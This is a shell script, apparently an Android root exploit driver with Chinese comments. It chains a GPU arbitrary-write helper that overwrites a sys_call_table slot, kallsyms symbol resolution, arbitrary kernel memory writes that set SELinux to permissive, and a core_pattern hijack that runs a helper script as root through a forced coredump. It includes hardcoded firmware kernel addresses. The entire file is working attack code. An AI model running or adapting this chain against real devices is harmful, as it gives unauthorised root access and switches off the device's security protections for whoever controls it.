#!/system/bin/sh
#
# 提权链驱动：GPU 写空槽 -> kallsyms 自举 -> memcpy -> 关 SELinux -> core_pattern
#
# 固件相关常量（3396 固件实测值；其他固件用环境变量覆盖）：
#   KLN_ADDR   kallsyms_lookup_name 虚拟地址
#   SLOT_PHYS  sys_call_table[244] 物理地址
KLN_ADDR=${KLN_ADDR:-ffffffc00111f308}
SLOT_PHYS=${SLOT_PHYS:-1f737a0}

set -u
D=/data/local/tmp

say() { echo "[run] $*"; }
die() { echo "[run] FATAL: $*" >&2; exit 1; }

[ -x "$D/gpu_arb_write" ] || die "$D/gpu_arb_write missing"
[ -x "$D/kfunc" ]         || die "$D/kfunc missing"

# stage 0: 空槽 <- kallsyms_lookup_name
say "stage 0: sys_call_table[244..259] <- kallsyms_lookup_name"
"$D/gpu_arb_write" "$SLOT_PHYS" "$KLN_ADDR" || die "gpu write failed"

# stage 1: 解析符号
resolve() {
    out=$("$D/kfunc" sym "$1" 2>/dev/null) || die "cannot resolve $1"
    echo "$out" | awk -F'0x' '{print $2}' | tail -1
}

MEMCPY=$(resolve memcpy)
SELINUX_ENFORCING=$(resolve selinux_enforcing)
CORE_PATTERN=$(resolve core_pattern)
say "memcpy            = 0x$MEMCPY"
say "selinux_enforcing = 0x$SELINUX_ENFORCING"
say "core_pattern      = 0x$CORE_PATTERN"

# stage 2: 空槽 <- memcpy（任意内核读写）
say "stage 2: sys_call_table[244..259] <- memcpy"
"$D/gpu_arb_write" "$SLOT_PHYS" "$MEMCPY" || die "gpu write failed"

# stage 3: SELinux -> permissive（热变量必须 CPU 侧写）
say "stage 3: selinux_enforcing = 0"
"$D/kfunc" zero "$SELINUX_ENFORCING" 4 || die "write failed"
say "getenforce -> $(getenforce 2>/dev/null)"

# stage 4: core_pattern <- root helper
say "stage 4: core_pattern <- |$D/roothelper.sh"
"$D/kfunc" str "$CORE_PATTERN" "|$D/roothelper.sh" || die "write failed"

# stage 5: 触发 coredump，内核以 root 执行 roothelper.sh
say "stage 5: triggering coredump"
rm -f "$D/root.log"
ulimit -c unlimited 2>/dev/null
( kill -SEGV $$ ) 2>/dev/null
sleep 2

if [ -f "$D/root.log" ]; then
    say "success - helper ran as root:"
    sed 's/^/    /' "$D/root.log"
else
    say "helper did not run"
    exit 3
fi
